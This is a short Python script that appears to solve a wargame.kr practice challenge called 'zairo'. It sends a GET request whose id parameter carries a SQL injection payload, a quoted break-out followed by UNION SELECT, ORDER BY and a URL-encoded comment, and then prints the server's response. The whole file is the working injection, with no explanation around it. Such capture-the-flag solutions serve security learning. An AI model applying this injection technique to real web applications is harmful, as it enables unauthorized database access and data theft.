from requests import *
url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\' union select 1,2,3,\'n!\',5 order by 4 asc %23'
response=get(url=url)
print(url)
print(response.text)